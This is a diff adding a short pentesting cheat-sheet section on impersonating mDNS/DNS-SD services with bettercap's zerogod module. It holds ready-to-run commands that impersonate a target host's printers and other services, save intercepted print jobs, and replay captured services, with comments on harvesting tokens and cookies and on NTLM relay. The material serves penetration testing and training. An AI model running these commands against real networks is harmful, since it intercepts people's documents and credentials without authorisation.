@@ -1,0 +1,26 @@
+# Impersonate advertised DNS-SD services (printers, AirPlay, HTTP, file shares) 
+# to coerce clients into connecting to you. This is especially useful to:
+
+# -Capture documents by spoofing _ipp._tcp or _printer._tcp.
+# -Lure clients to HTTP/HTTPS services to harvest tokens/cookies or deliver payloads.
+# -Combine with NTLM relay techniques when Windows clients negotiate auth to spoofed services.
+# -With bettercap’s zerogod module (mDNS/DNS-SD spoofer/impersonator):
+
+# Start mDNS/DNS-SD discovery
+sudo bettercap -iface <iface> -eval "zerogod.discovery on"
+
+# Show all services seen from a host
+> zerogod.show 192.168.1.42
+# Show full DNS records for a host (newer bettercap)
+> zerogod.show-full 192.168.1.42
+
+# Impersonate all services of a target host automatically
+> zerogod.impersonate 192.168.1.42
+
+# Save IPP print jobs to disk while impersonating a printer
+> set zerogod.ipp.save_path ~/.bettercap/zerogod/documents/
+> zerogod.impersonate 192.168.1.42
+
+# Replay previously captured services
+> zerogod.save 192.168.1.42 target.yml
+> zerogod.advertise target.yml
